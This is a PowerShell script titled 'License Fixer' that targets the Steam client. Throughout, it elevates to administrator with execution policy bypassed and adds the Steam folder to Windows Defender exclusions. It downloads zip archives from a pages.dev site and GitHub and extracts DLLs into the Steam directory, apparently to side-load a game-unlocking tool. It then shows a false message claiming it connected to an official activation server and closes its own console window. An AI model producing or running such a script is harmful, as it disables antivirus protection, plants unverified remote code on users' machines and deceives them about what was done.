[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $null = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
}
catch {}

function Disable-QuickEdit {
    try {
        $hInput = [Win32.Kernel32Functions]::GetStdHandle(-10)
        $mode = 0
        if ([Win32.Kernel32Functions]::GetConsoleMode($hInput, [ref]$mode)) {
            $mode = $mode -band -not (0x0040 -bor 0x0020)
            [Win32.Kernel32Functions]::SetConsoleMode($hInput, $mode -bor 0x0080)
        }
    }
    catch {}
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

# Admin kontrolü
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    $scriptContent = @'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
try {
    $MethodDefinition = @'\''
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'\''@
    $null = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
}
catch {}

function Disable-QuickEdit {
    try {
        $hInput = [Win32.Kernel32Functions]::GetStdHandle(-10)
        $mode = 0
        if ([Win32.Kernel32Functions]::GetConsoleMode($hInput, [ref]$mode)) {
            $mode = $mode -band -not (0x0040 -bor 0x0020)
            [Win32.Kernel32Functions]::SetConsoleMode($hInput, $mode -bor 0x0080)
        }
    }
    catch {}
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$steamRegPath = "HKCU:\Software\Valve\Steam"
$steamPath = ""

if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and "SteamPath" -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# Defender exclusion
try {
    $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
    if ($existing -and $existing -contains $steamPath) {
        Write-Host "[+] Steam folder already excluded." -ForegroundColor Green
    } else {
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
        Write-Host "[+] Steam folder excluded successfully." -ForegroundColor Green
    }
} catch {}

# Clean old files
$oldFiles = @("winhttp.dll","dwmapi.dll","SYS_0xA7.dll","hid.dll","xinput1_4.dll","version.dll","OpenSteamTool.dll","SYS_0xA7.toml","opensteamtool.toml")
foreach ($f in $oldFiles) {
    $fp = Join-Path $steamPath $f
    if (Test-Path $fp) { Remove-Item -Path $fp -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue }
}

# Clean appcache
$appcache = Join-Path $steamPath "appcache"
if (Test-Path $appcache) {
    cmd /c "icacls `"$appcache`" /reset /T /C" | Out-Null
    cmd /c "attrib -s -h -r `"$appcache`"" | Out-Null
    Remove-Item -Path $appcache -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
}

# Clean other paths
$cfgPath = Join-Path $steamPath "steam.cfg"
if (Test-Path $cfgPath) { Remove-Item -Path $cfgPath -Force -ErrorAction SilentlyContinue }

$betaPath = Join-Path $steamPath "package\beta"
if (Test-Path $betaPath) { Remove-Item -Path $betaPath -Recurse -Force -ErrorAction SilentlyContinue }

$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
if (Test-Path $tencentPath) { Remove-Item -Path $tencentPath -Recurse -Force -ErrorAction SilentlyContinue }

# Create gamesdata folder
$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
if (!(Test-Path $gamesDataPath)) { New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }

# Download Gamevia.zip with multiple fallbacks
$zip1 = Join-Path $env:TEMP "Gamevia.zip"
$downloaded1 = $false

$urls1 = @(
    "https://zdb2.pages.dev/Gamevia.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
)

foreach ($url in $urls1) {
    try {
        Write-Host "[*] Trying: $url" -ForegroundColor Gray
        Invoke-RestMethod -Uri $url -OutFile $zip1 -ErrorAction Stop
        if ((Test-Path $zip1) -and ((Get-Item $zip1).Length -gt 0kb)) {
            Write-Host "[+] Gamevia.zip downloaded." -ForegroundColor Green
            $downloaded1 = $true
            break
        }
    }
    catch {
        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
    }
}

if ($downloaded1 -and (Test-Path $zip1)) {
    Expand-Archive -Path $zip1 -DestinationPath $gamesDataPath -Force -ErrorAction SilentlyContinue | Out-Null
    $dkp = Join-Path $gamesDataPath "depotkeys.json"
    if (Test-Path $dkp) { Remove-Item -Path $dkp -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $zip1 -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Gamevia extracted." -ForegroundColor Green
} else {
    Write-Host "[-] Gamevia.zip download failed from all sources." -ForegroundColor Red
}

# Download dllg.zip with multiple fallbacks
$zip2 = Join-Path $env:TEMP "dllg.zip"
$downloaded2 = $false

$urls2 = @(
    "https://zdb2.pages.dev/dllg.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dllg.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dllg.zip"
)

foreach ($url in $urls2) {
    try {
        Write-Host "[*] Trying: $url" -ForegroundColor Gray
        Invoke-RestMethod -Uri $url -OutFile $zip2 -ErrorAction Stop
        if ((Test-Path $zip2) -and ((Get-Item $zip2).Length -gt 0kb)) {
            Write-Host "[+] dllg.zip downloaded." -ForegroundColor Green
            $downloaded2 = $true
            break
        }
    }
    catch {
        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
    }
}

if ($downloaded2 -and (Test-Path $zip2)) {
    Expand-Archive -Path $zip2 -DestinationPath $steamPath -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item -Path $zip2 -Force -ErrorAction SilentlyContinue
    Write-Host "[+] DLLs extracted successfully." -ForegroundColor Green
} else {
    Write-Host "[-] dllg.zip download failed from all sources." -ForegroundColor Red
}

# Start Steam
$steamExe = Join-Path $steamPath "steam.exe"
Start-Process $steamExe
Start-Process "steam://"

Write-Host "`n[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

for ($i = 5; $i -ge 0; $i--) {
    Write-Host "`r[This window will close in $i seconds...]" -NoNewline
    Start-Sleep -Seconds 1
}

try {
    $parentProcessId = $PID
    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" -ErrorAction SilentlyContinue
    while ($null -ne $instance -and ("powershell.exe","WindowsTerminal.exe","pwsh.exe" -contains $instance.ProcessName)) {
        $parentProcessId = $instance.ProcessId
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'" -ErrorAction SilentlyContinue
    }
    if ($null -ne $parentProcessId) {
        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
    }
} catch {}
exit
'@

    $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
    Set-Content -Path $scriptPath -Value $scriptContent -Encoding UTF8 -Force
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit
cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# Defender exclusion
try {
    $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
    if ($existing -and $existing -contains $steamPath) {
        Write-Host "[+] Steam folder already excluded." -ForegroundColor Green
    }
    else {
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
        Write-Host "[+] Steam folder excluded successfully." -ForegroundColor Green
    }
}
catch {}

# Clean old files
$oldFiles = @("winhttp.dll","dwmapi.dll","SYS_0xA7.dll","hid.dll","xinput1_4.dll","version.dll","OpenSteamTool.dll","SYS_0xA7.toml","opensteamtool.toml")
foreach ($f in $oldFiles) {
    $fp = Join-Path $steamPath $f
    if (Test-Path $fp) { Remove-Item -Path $fp -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue }
}

# Clean appcache
$appcache = Join-Path $steamPath "appcache"
if (Test-Path $appcache) {
    cmd /c "icacls `"$appcache`" /reset /T /C" | Out-Null
    cmd /c "attrib -s -h -r `"$appcache`"" | Out-Null
    Remove-Item -Path $appcache -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
}

# Other cleanup
$cfgPath = Join-Path $steamPath "steam.cfg"
if (Test-Path $cfgPath) { Remove-Item -Path $cfgPath -Force -ErrorAction SilentlyContinue }

$betaPath = Join-Path $steamPath "package\beta"
if (Test-Path $betaPath) { Remove-Item -Path $betaPath -Recurse -Force -ErrorAction SilentlyContinue }

$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
if (Test-Path $tencentPath) { Remove-Item -Path $tencentPath -Recurse -Force -ErrorAction SilentlyContinue }

# Create gamesdata folder
$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
if (!(Test-Path $gamesDataPath)) { New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }

# --- Download Gamevia.zip with 3 fallback URLs ---
$zip1 = Join-Path $env:TEMP "Gamevia.zip"
$downloaded1 = $false

$urls1 = @(
    "https://zdb2.pages.dev/Gamevia.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
)

foreach ($url in $urls1) {
    try {
        Write-Host "[*] Trying: $url" -ForegroundColor Gray
        Invoke-RestMethod -Uri $url -OutFile $zip1 -ErrorAction Stop
        if ((Test-Path $zip1) -and ((Get-Item $zip1).Length -gt 0kb)) {
            Write-Host "[+] Gamevia.zip downloaded." -ForegroundColor Green
            $downloaded1 = $true
            break
        }
    }
    catch {
        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
    }
}

if ($downloaded1 -and (Test-Path $zip1)) {
    Expand-Archive -Path $zip1 -DestinationPath $gamesDataPath -Force -ErrorAction SilentlyContinue | Out-Null
    $dkp = Join-Path $gamesDataPath "depotkeys.json"
    if (Test-Path $dkp) { Remove-Item -Path $dkp -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $zip1 -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Gamevia extracted." -ForegroundColor Green
}
else {
    Write-Host "[-] Gamevia.zip download failed from all sources." -ForegroundColor Red
}

# --- Download dllg.zip with 3 fallback URLs ---
$zip2 = Join-Path $env:TEMP "dllg.zip"
$downloaded2 = $false

$urls2 = @(
    "https://zdb2.pages.dev/dllg.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dllg.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dllg.zip"
)

foreach ($url in $urls2) {
    try {
        Write-Host "[*] Trying: $url" -ForegroundColor Gray
        Invoke-RestMethod -Uri $url -OutFile $zip2 -ErrorAction Stop
        if ((Test-Path $zip2) -and ((Get-Item $zip2).Length -gt 0kb)) {
            Write-Host "[+] dllg.zip downloaded." -ForegroundColor Green
            $downloaded2 = $true
            break
        }
    }
    catch {
        Write-Host "[!] Failed: $url" -ForegroundColor Yellow
    }
}

if ($downloaded2 -and (Test-Path $zip2)) {
    Expand-Archive -Path $zip2 -DestinationPath $steamPath -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item -Path $zip2 -Force -ErrorAction SilentlyContinue
    Write-Host "[+] DLLs extracted successfully." -ForegroundColor Green
}
else {
    Write-Host "[-] dllg.zip download failed from all sources." -ForegroundColor Red
}

# Start Steam
$steamExe = Join-Path $steamPath "steam.exe"
Start-Process $steamExe
Start-Process "steam://"

Write-Host "`n[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

for ($i = 5; $i -ge 0; $i--) {
    Write-Host "`r[This window will close in $i seconds...]" -NoNewline
    Start-Sleep -Seconds 1
}

try {
    $parentProcessId = $PID
    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" -ErrorAction SilentlyContinue
    while ($null -ne $instance -and ("powershell.exe","WindowsTerminal.exe","pwsh.exe" -contains $instance.ProcessName)) {
        $parentProcessId = $instance.ProcessId
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'" -ErrorAction SilentlyContinue
    }
    if ($null -ne $parentProcessId) {
        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
    }
}
catch {}

exit
